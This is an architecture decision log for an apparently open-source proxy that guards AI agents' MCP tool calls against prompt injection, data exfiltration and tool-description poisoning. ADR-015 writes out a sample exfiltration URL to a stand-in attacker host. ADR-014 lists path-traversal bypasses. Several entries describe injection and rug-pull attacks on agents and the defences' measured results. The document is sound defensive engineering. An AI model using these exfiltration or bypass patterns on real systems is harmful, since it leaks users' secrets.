# decisions.md — Architecture Decision Log

Short ADRs. Append new entries; never rewrite history. If a decision is reversed, add a new entry that supersedes it.

Format: **Status · Context · Decision · Consequences.**

---

## ADR-001 — Scope is MCP traffic only
**Status:** Accepted · 2026-09-30
**Context:** Agents also use native tools (built-in shell, browser, file access) that never pass through an MCP proxy.
**Decision:** The proxy governs MCP tool calls only. Native tools are an explicit non-goal.
**Consequences:** Clear, defensible scope and a buildable v1. The README and DESIGN must state this blind spot prominently. Users needing full coverage must pair this with OS-level sandboxing.

## ADR-002 — Session-level taint instead of per-argument provenance (v1)
**Status:** Accepted · 2026-09-30
**Context:** Per-call allowlists cannot stop the core attack: untrusted content + private data + an egress channel within one session. Per-argument provenance would be more precise but is a research project in itself.
**Decision:** Track two coarse session labels (`untrusted_content`, `private_data`), applied by declared sources and cleared only by explicit human approval.
**Consequences:** Deterministic, provable (a small state machine), buildable solo. Over-blocks after any untrusted read; the false-positive rate is measured and reported (H5). Per-argument provenance is future work.

## ADR-003 — Deterministic policy is the security claim; detectors are advisory
**Status:** Accepted · 2026-09-30
**Context:** Regex/heuristic injection detection is bypassable and turns the project into an arms race; benchmarking our own detectors against our own attacks is self-graded.
**Decision:** Policy + flow control + pinning provide the guarantees. Detectors only emit `flags`/`risk_score` and never change a decision in v1. Detector logic is frozen before the held-out set is written.
**Consequences:** Honest claims, smaller maintenance surface. We do not market "detects injections." The detector benchmark result (H3) may show little gain, and we report that.

## ADR-004 — Default deny and fail closed
**Status:** Accepted · 2026-09-30
**Context:** A security proxy that fails open on misconfiguration gives false assurance.
**Decision:** Tools not explicitly allowed for the agent are denied. An invalid policy file prevents startup. Unanswered approvals time out to deny.
**Consequences:** Safer defaults; more friction during initial setup. Requires good validation error messages.

## ADR-005 — YAML for policy, JSONL for audit logs, both versioned
**Status:** Accepted · 2026-09-30
**Context:** Need human-writable policy and machine-processable, append-only logs that the benchmark can score from.
**Decision:** Policy in YAML (`version: 1`, closed vocabularies, unknown keys rejected). Audit log in JSON Lines (`schema_version: 1`), which is the benchmark's ground truth.
**Consequences:** Easy to diff, review, and cite. Any schema change after benchmark runs start requires a version bump to keep results reproducible.

## ADR-006 — Python for core and proxy; TypeScript only for optional UI
**Status:** Accepted · 2026-09-30
**Context:** Official MCP SDKs exist for both; the benchmark ecosystem (AgentDojo) is Python; security tooling iterates fastest in Python.
**Decision:** `mcpsec_core`, `proxy`, CLI, and benchmark are Python. TypeScript is reserved for the optional web approval UI (stretch).
**Consequences:** One primary language reduces integration cost. Latency budget (<10 ms per call for non-LLM checks) must be verified with profiling early.

## ADR-007 — `mcpsec_core` is a standalone library
**Status:** Accepted · 2026-09-30
**Context:** AgentDojo/InjecAgent are not MCP-native; adapters need to enforce policy at their own tool boundaries.
**Decision:** Policy, taint, flow, pinning, and audit are pure library code with explicit state, independent of the MCP transport. The proxy is a thin adapter over it.
**Consequences:** Pure functions are unit-testable and reusable by benchmark adapters. Slightly more up-front structure.

## ADR-008 — Human approval is CLI-based in v1; web UI is a stretch goal
**Status:** Accepted · 2026-09-30
**Context:** Flow rules clear taint "on approval," so some approval path is required for the core feature to be usable.
**Decision:** Ship `mcpsec-approve` (file-based pending queue) in the flow-control phase. Defer any web UI.
**Consequences:** Core feature is complete without UI work. The UX is rough but sufficient for demos and the benchmark.

## ADR-009 — Held-out benchmark set with a frozen-defense rule
**Status:** Accepted · 2026-09-30
**Context:** Authors who write both defenses and attacks tend to overfit; credibility depends on avoiding that.
**Decision:** Tag defenses (`v0.2-frozen`) before authoring held-out scenarios; never tune on them; report post-hoc fixes separately. Report raw counts with 95% Wilson intervals across multiple models and trials.
**Consequences:** Slower iteration on attack scenarios; substantially stronger claims. Also use external suites (AgentDojo, InjecAgent) for independent validation.

## ADR-010 — Pinning: trust-on-first-use only in audit mode
**Status:** Accepted · 2026-09-30
**Context:** Silent first-use pinning in a strict deployment would pin a malicious description.
**Decision:** In `strict` mode the first sight of a server requires an explicit `mcpsec-pin approve`. `tools/list_changed` produces a logged pin event, never a silent accept.
**Consequences:** More setup friction in strict mode; closes the tool-poisoning-at-first-sight gap for careful users.

## ADR-011 — License: Apache-2.0
**Status:** Accepted · 2026-09-30
**Context:** Aiming for wide adoption and possible corporate use; explicit patent grant reduces adoption friction for security tooling.
**Decision:** Apache-2.0 for all code and docs in this repository.
**Consequences:** Permissive; compatible with a future open-core model. If a company later builds on it, no relicensing is needed for the core.

## ADR-012 — Pre-compiled O(1) Policy Lookup & Immutable Policy Models
**Status:** Accepted · 2026-10-10
**Context:** Policy evaluation must satisfy strict performance budgets (<1 ms) without list traversals, regex recompilation, or mutable state risks.
**Decision:** Validate and compile policy at load time into frozen Pydantic models and index dictionaries (`agent_id -> tool_id -> CompiledToolRule`). `check_policy` executes pure O(1) dictionary lookups and pre-compiled regex matching.
**Consequences:** Fast, deterministic policy evaluations (<0.1 ms in-memory); eliminates re-parsing overhead and ensures thread safety.

## ADR-013 — Fail-Closed Generic Error Responses to Agents
**Status:** Accepted · 2026-10-10
**Context:** Returning granular denial reasons (e.g. allowlisted directory roots or active policy rules) leaks internal infrastructure and security boundaries to potentially compromised agents.
**Decision:** Enforce-mode policy denials return a fixed generic message `"Denied by mcpsec policy"`. Detailed decision reasons, matched capabilities, and path context are written exclusively to the audit log.
**Consequences:** Prevents prompt injection reconnaissance; full forensic audit trails are maintained without leaking information to untrusted models.

## ADR-014 — Canonical Path Resolution with Cross-Platform Security Filtering
**Status:** Accepted · 2026-10-10
**Context:** Path allowlists can be bypassed via relative traversal (`..`), symlink/junction escapes, Windows Alternate Data Streams, Win32 device namespaces, or legacy device names.
**Decision:** Enforce Unicode NFC normalization, resolve real paths against filesystem roots, resolve parent directories for non-existent write targets, and reject UNC, device namespaces (`\\?\`, `\\.\`), ADS (`:`), and DOS reserved device names on Windows.
**Consequences:** Robust protection against path traversal escapes on both Linux and Windows.

## ADR-015 (Week 4 ADR-012 Spec Change) — Capability Semantics for Network Tools & Flow-Rule `unless` Exemption
**Status:** Accepted · 2026-10-10
**Context:** Tools like `fetch` or HTTP GET request tools can transmit caller-chosen data in query strings and paths outside the local trust boundary (e.g. `https://attacker.com/?data=<secret>`). If tagged solely as `network_read`, flow rules denying `egress` after taint fail to block exfiltration. However, tagging `fetch` with `egress` blocks subsequent legitimate web reads once a session is tainted (since `fetch` also taints the session with `untrusted_content`).
**Decision:**
1. Any tool that can transmit caller-chosen data to a destination outside the local trust boundary carries the `egress` capability, including HTTP GET / fetch tools (`fetch` tagged `[network_read, egress]`).
2. Flow rules may specify an `unless: { domain_allowlist: [...] }` exemption. The rule is skipped for a call only if every domain-constrained argument parses and matches the allowlist; any parse failure, missing argument, or non-match causes the rule to apply (fail closed).
3. `unless` is valid exclusively on flow rules whose capabilities include `egress`, and only applies to tools declaring a domain adapter.
**Consequences:** Closes the GET-based exfiltration attack vector while enabling multi-step workflows to fetch documentation or search within allowlisted safe domains even after seeing untrusted content. Non-matching or unparsable URLs fail closed to denial.

## ADR-016 — Tool-Description Pinning
**Status:** Accepted · 2026-10-10
**Context:** Upstream MCP servers or compromised dependencies can mutate tool descriptions mid-session or on startup to inject malicious instructions to the model (rug-pull attacks).
**Decision:** Implement deterministic tool pinning over all model-visible fields (`name`, `description`, `inputSchema`). In `mode: strict`, unpinned or modified tools are hidden from `tools/list` and blocked from invocation. Tool approvals are stored in `pins.json` with atomic writes and cross-platform file locking.
**Consequences:** Closes the tool description poisoning vector (ATTACK-22). Requires initial tool review/approval (`mcpsec-pin approve`).

## ADR-017 — Removal of Path Resolution Cache to Prevent TOCTOU Retargeting
**Status:** Accepted · 2026-10-10
**Context:** Caching path resolutions across tool calls introduces a race window where symlinks or directory junctions can be retargeted to sensitive locations outside the sandbox after validation.
**Decision:** Never cache filesystem path canonicalization across tool calls. Every path check resolves real paths dynamically against the OS filesystem table on every invocation.
**Consequences:** Closes cache-window symlink retargeting attacks; eliminates stale path state at negligible latency cost (<2 ms per call).

## ADR-018 — Benchmark Configuration C5 Adoption, Attended vs Unattended Deployment Modes, and Flow-Rule Path Exemptions
**Status:** Accepted · 2026-11-06
**Context:**
1. The Pareto evaluation in Chunk 5.16 demonstrated that configuration E3 (approval-based untrusted egress containment paired with curated domain unless exemptions) passed all four pre-registered selection bars (hard-block rate 0.00% <= 5.0%, approve-all completion 100.0% >= 90.0%, in-scope ASR under deny_all 5.0% <= 10.0%, and approvals per task 0.54 <= 1.0). The owner has selected E3 as the freeze candidate and adopted it as benchmark configuration C5.
2. Real-world agent deployments operate under two primary operating modes:
   - **Unattended Deployment Mode:** Human operators are offline or unavailable. Any tool invocation triggering an approval requirement times out and fails closed to denial (`deny_all`). Guarantees: rigorous, automated protection against indirect prompt injection and unauthorized egress.
   - **Attended Deployment Mode:** Human operators review and decide pending approvals (`approve_all` models the worst-case scenario where an operator approves all flagged calls). Guarantees: benign workflows requiring elevated actions proceed, but operator fatigue or uncritical approval creates an exposure window.
3. In benign workflows, legitimate agents frequently generate local synthesis files, scratch notes, or changelogs after reading untrusted external documentation or issues. Under C5, `appr-untrusted-write` holds all write operations for human approval once untrusted taint is present (accounting for ~76% of total approval friction). To alleviate operator burden without compromising security-sensitive project code, a path-level exemption mechanism is required for isolated scratch directories.
**Decision:**
1. Freeze E3 as benchmark configuration `C5` (`benchmark/configs/C5.yaml`). Definitions of C0–C4 remain immutable. E0–E3 configuration files remain preserved for reproducibility.
2. Formally define evaluation metrics across both deployment modes:
   - `Hard-block rate`: fraction of benign workflows denied outright at policy or flow layer without an approval path (k/n, %).
   - `Approval-needed rate`: fraction of benign workflows requiring at least one approval before completion (k/n, %).
   - `Approvals per task`: mean approvals requested per task under `approve_all` before completion, partitioned by triggering rule.
   - `ASR under deny_all`: unattended deployment guarantee (worst-case attack success under automated timeout).
   - `ASR under approve_all`: attended deployment upper bound (worst-case attack success under complete approval fatigue).
3. Introduce flow-rule `unless: { path_allowlist: [...] }`. Valid ONLY on flow rules whose capabilities include `write`, and applicable ONLY to tools declaring a path argument adapter. Semantics mirror domain `unless`: the rule is skipped if and only if EVERY path-constrained argument successfully parses, normalizes with canonical realpath/UNC/device/junction rules, and matches the allowlist; any parse failure or non-match fails closed so the flow rule applies. Invalid configurations fail closed with dedicated error codes (`ERR_INVALID_UNLESS_PATH`, `ERR_UNLESS_PATH_NON_WRITE`, `ERR_INVALID_PATH_PATTERN`).
**Consequences:**
- C5 provides an explicit freeze candidate evaluated under both unattended and attended paradigms.
- Flow-rule path exemptions enable fine-grained isolation of scratch directories (e.g. `sandbox/notes/**`), reducing human operator fatigue on benign synthesis tasks.
- If an agent writes malicious instructions to an exempt scratch directory (e.g. cross-session persistence), path exemptions permit the write without approval; this is tracked as a documented known-gap tradeoff.

## ADR-019 — Adoption of C6 as Final Default Profile and Two-Mode Deployment Model
**Status:** Accepted · 2026-11-10
**Context:**
1. Ablation experiments across Chunks 5.17–5.17c demonstrated:
   - Configuration C5 (restored E3) established approval-based untrusted egress containment with curated domain exemptions.
   - Configuration E4b introduced flow-rule write path exemptions (`sandbox/notes/**`), eliminating approval friction for local synthesis and scratch notes without loosening code directory protections.
   - Configuration E5 introduced file-origin untrusted content taint sources on filesystem read tools for non-project directories (`**/node_modules/**`, `**/vendor/**`, `**/.venv/**`, `**/site-packages/**`, `**/downloads/**`, and scratch output `sandbox/notes/**`), preventing untrusted dependency injection and cross-session persistence poisoning from escaping taint boundaries.
2. In-scope attack ATTACK-23 evaluates mid-session upstream tool-description rug-pull / mutation attacks. Under unpinned configurations (C1, C2, C5, E4b, E5), an upstream server can alter tool descriptions mid-session without triggering policy or flow rule violations. Strict tool-description pinning (`pinning.mode: strict`, as demonstrated in C4) computes deterministic hashes over non-volatile schema fields and rejects unauthorized mutations.
3. Combining E5 with strict tool-description pinning yields configuration `C6`.
**Decision:**
1. Adopt `C6` (`benchmark/configs/C6.yaml`: E5 + `pinning: { mode: strict, store: ./benchmark/configs/pins.json }`) as the frozen default profile for `mcpsec-lite`.
2. Retain configurations C0–C5 unchanged in specification and disk; maintain E4b and E5 as documented ablations.
3. Formally specify the security guarantees and claims for the two deployment modes under C6:
   - **Unattended Deployment Mode (`deny_all`):** Automated execution without human operator presence. Pending approval requests time out and fail closed to denial. Security claim: 0% in-scope attack success rate (ASR = 0/21, 0.0%) against indirect prompt injection, data exfiltration, unauthorized file writes, and mid-session tool mutations. Benign workflow completion is determined by whether the task strictly avoids unapproved writes or egress outside exempt paths and curated domains.
   - **Attended Deployment Mode (`approve_all`):** Operator availability where human reviewers decide pending approvals. Evaluated under `approve_all` to establish the theoretical upper bound on risk under complete operator approval fatigue / rubber-stamping. In this mode, in-scope attacks that reach the approval tier succeed if blindly approved, underscoring that human approval is a human-in-the-loop defense requiring high-fidelity contextual prompts.
**Consequences:**
- C6 provides a hardened, deterministic defense combining static capability allowlists, fine-grained path and domain flow-rule exemptions, file-origin untrusted taint tracking, and cryptographic tool-description pinning.
- C5, E4b, and E5 remain preserved as ablations showing the incremental security and false-positive impacts of each defensive layer.
- Operators deploying in unattended environments obtain strong automated containment (0% in-scope ASR), while attended environments rely on informative approval prompts to prevent approval fatigue.

## ADR-020 — Support for Official `github/github-mcp-server` `v2.3.0` Schema & Benchmark Config `C7`
**Status:** Accepted · 2026-11-25
**Context:**
1. The 8-tool baseline fixture [`tests/fixtures/github.tools.json`](file:///c:/Users/BIT%20PATNA/ai-agent-firewall/tests/fixtures/github.tools.json) is `UNVERIFIED-handwritten` (benchmark mock), and C0–C6 reference missing tool names (`github.get_issue`, `github.get_pull_request`, `github.create_issue_comment`) and superseded parameter schemas relative to official [`github/github-mcp-server` `v2.3.0`](file:///c:/Users/BIT%20PATNA/ai-agent-firewall/tests/fixtures/github.tools.official.json) (`46` default `stdio` tools; `27` under `--read-only`).
2. Pre-freeze alignment requires reviewed official adapter definitions (`mcpsec_core/adapters.py`), a bidirectional offline CI contract test against `github.tools.official.json`, a pre-registered translation map (`benchmark/github_official_map.json`), an official-schema benchmark profile `C7` (`benchmark/configs/C7.yaml`), and behavioral equivalence verification against `C6` without altering core flow/taint/pinning/matching logic or deleting C0–C6 historical artifacts.

**Decision:**
1. Add a reviewed static pure-data table `OFFICIAL_GITHUB_TOOL_TABLE` in [`mcpsec_core/adapters.py`](file:///c:/Users/BIT%20PATNA/ai-agent-firewall/mcpsec_core/adapters.py) defining all `46` default tools from `tests/fixtures/github.tools.official.json`: exact `github.<tool>` adapter `all_args` matching `inputSchema.properties`, `capabilities`, `taint_class` (`U`/`P`/`T`), and `read_only` flag taken directly from [`docs/github_tool_mapping.md`](file:///c:/Users/BIT%20PATNA/ai-agent-firewall/docs/github_tool_mapping.md). Unpack the official `github.*` adapters into `_BUILTIN_ADAPTERS` from that table; any GitHub tool absent from the table (including `--toolsets all` extras and deprecated/mock names) stays unknown and is denied by default policy (fail closed).
2. Explicitly document reviewed disagreements and edge cases relative to `docs/github_tool_mapping.md` (without reinventing capability or taint assignments):
   - **`path_args` on remote GitHub tools:** Pre-5.18d `adapters.py` set `path_args=("path",)` on `github.get_file_contents`, whereas `docs/github_tool_mapping.md` warns `path` is optional in `v2.3.0` (`required: ["owner", "repo"]`) and `extract_path_arguments` evaluates local OS filesystem paths via `normalize_path`. ADR-020 sets `path_args=()` across all `46` remote GitHub tools (`get_file_contents`, `create_or_update_file`, `delete_file`, `add_comment_to_pending_review`, `list_commits`) while keeping `all_args` strict.
   - **Conservative taint notes preserved from `docs/github_tool_mapping.md`:** `list_branches`, `list_tags`, `list_issue_fields`, `list_issue_types`, and `list_repository_collaborators` retain `T` (`[network_read]`) noting `list_branches` could be upgraded to `U` in strict multi-tenant deployments; `get_me`, `get_teams`, and `get_team_members` retain `T` (`[network_read]`) noting private-org deployments could classify org membership as `P`; the `19` write tools retain `T` (`[write, egress]`). No capability or taint class in `OFFICIAL_GITHUB_TOOL_TABLE` departs from `docs/github_tool_mapping.md`.
   - **Argument / method translations:** Consolidated official tools require `method: "get"` (`get_issue -> issue_read`, `get_pull_request -> pull_request_read` with `pull_number -> pullNumber`), and comment egress moves `create_issue_comment -> add_issue_comment`.
3. Keep `tests/fixtures/github.tools.json` explicitly labeled `"benchmark mock"` in `tests/fixtures/github.tools.meta.json`, replace the skipped GitHub contract test in [`tests/test_contract.py`](file:///c:/Users/BIT%20PATNA/ai-agent-firewall/tests/test_contract.py) with a bidirectional offline conformance test (`table == snapshot` tools and `all_args`), and retain C0–C6 unchanged.
4. Define `C7` (`benchmark/configs/C7.yaml`) = `C6` with the GitHub section migrated to official names: allowlist default-deny to only the read tools dev scenarios invoke (`github.issue_read`, `github.list_issues`, `github.search_repositories`) plus `github.add_issue_comment`, and `taint_sources.untrusted_content` populated with all `19` `U`-classified tools from `OFFICIAL_GITHUB_TOOL_TABLE` (including `github.issue_read` and `github.pull_request_read`).

**Consequences:**
- All 46 default official `github-mcp-server v2.3.0` tools have audited static definitions tested offline in CI against the captured snapshot.
- `C6` (handwritten) and `C7` (official) can be compared directly on identical dev scenarios via `--github-schema official`.

## ADR-021 (Proposed) — Fail-Closed Policy Rejection for Official Read-Tool Taint Holes
**Status:** Proposed · 2026-11-25 *(Not implemented in Chunk 5.18d — deferred because enforcement requires core logic changes in `mcpsec_core/policy.py`)*
**Context:** If a deployment allowlists an official `U`-classified GitHub read tool (e.g., `github.issue_read` or `github.pull_request_read`) in `capabilities` and `policies` while using `flow_rules` referencing `untrusted_content`, omitting that tool from `taint_sources.untrusted_content` silently skips tainting ("taint hole").
**Proposed Decision:** When validating a policy whose `mode == "enforce"` and whose `flow_rules` reference `untrusted_content`, `validate_and_compile_policy` in `mcpsec_core/policy.py` should reject (`ERR_TAINT_SOURCE_MISSING`) any allowed tool in `OFFICIAL_GITHUB_TOOL_TABLE` whose `taint_class == "U"` is absent from `taint_sources.untrusted_content` (and correspondingly reject `P`-classified reads absent from `private_data` when referenced). Scoping to policies with active `flow_rules` referencing the label preserves static policy configs like `C1`.
**Consequences:** Prevents accidental taint-source omissions when migrating or customizing policies for `github-mcp-server v2.3.0`, without mutating `mcpsec_core/policy.py` during data/config Chunk 5.18d.


